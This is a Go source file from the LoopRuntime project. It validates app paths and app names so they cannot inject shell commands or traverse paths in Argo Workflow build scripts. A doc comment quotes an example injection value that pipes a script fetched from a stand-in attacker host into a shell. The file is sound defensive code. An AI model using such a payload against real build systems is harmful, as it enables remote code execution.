// SPDX-License-Identifier: Apache-2.0
// Copyright 2025-2026 The LoopRuntime Authors

// Package validation provides input validation for API request fields.
package validation

import (
	"fmt"
	"regexp"
	"strings"
)

// appPathRegex allows only alphanumeric characters, dots, underscores, hyphens, and slashes.
// No shell metacharacters, no null bytes, no spaces.
var appPathRegex = regexp.MustCompile(`^[a-zA-Z0-9._/-]+$`)

// appNameRegex allows lowercase alphanumeric and hyphens, starting with a letter.
// Matches RFC 1123 label names — same rule used for K8s namespace/service names.
// CODE-001 fix: app.Name flows into shell scripts in Argo Workflow build steps.
// Without validation, shell metacharacters enable command injection.
var appNameRegex = regexp.MustCompile(`^[a-z][a-z0-9-]{0,62}$`)

const maxAppPathLength = 255

// ValidateAppPath checks that an app path is safe for use in shell scripts and filesystem operations.
//
// SEC-3 fix: app.Path flows into Argo Workflow shell scripts (e.g., `cd "/workspace/{path}"`).
// Without validation, a malicious path could cause path traversal or command injection.
//
// Rules:
//   - Empty string is valid (normalized to "." by the consumer)
//   - Must not be absolute (no leading /)
//   - Must not contain ".." components (path traversal)
//   - Must match [a-zA-Z0-9._/-]+ (no shell metacharacters)
//   - Max 255 characters
func ValidateAppPath(path string) error {
	// Empty path is valid — the consumer defaults it to "."
	if path == "" || path == "." {
		return nil
	}

	if len(path) > maxAppPathLength {
		return fmt.Errorf("app path too long (%d chars, max %d)", len(path), maxAppPathLength)
	}

	// Reject absolute paths
	if strings.HasPrefix(path, "/") {
		return fmt.Errorf("app path must be relative, got absolute path: %q", path)
	}

	// Reject path traversal
	for _, component := range strings.Split(path, "/") {
		if component == ".." {
			return fmt.Errorf("app path must not contain '..': %q", path)
		}
	}

	// Reject shell metacharacters and unsafe characters
	if !appPathRegex.MatchString(path) {
		return fmt.Errorf("app path contains invalid characters (allowed: alphanumeric, dots, underscores, hyphens, slashes): %q", path)
	}

	// Reject trailing slash (likely a mistake)
	if strings.HasSuffix(path, "/") {
		return fmt.Errorf("app path must not end with '/': %q", path)
	}

	return nil
}

// ValidateAppName checks that an app name is safe for use in shell scripts,
// Kubernetes resource names, and container image tags.
//
// CODE-001 fix: app.Name flows into Argo Workflow shell scripts via
// loopRuntimePacksDockerfileStep() and buildctl arguments. Without validation,
// a malicious app name like "foo; curl attacker.com | sh" enables RCE
// in the build cluster.
//
// Rules:
//   - Must start with a lowercase letter
//   - May contain lowercase alphanumeric characters and hyphens
//   - Max 63 characters (RFC 1123 label)
//   - Must not be empty
func ValidateAppName(name string) error {
	if name == "" {
		return fmt.Errorf("app name must not be empty")
	}

	if !appNameRegex.MatchString(name) {
		return fmt.Errorf("app name must match RFC 1123 (lowercase alphanumeric and hyphens, start with letter, max 63 chars): %q", name)
	}

	// Reject names that are only hyphens
	if strings.Trim(name, "-") == "" {
		return fmt.Errorf("app name must contain at least one alphanumeric character: %q", name)
	}

	return nil
}
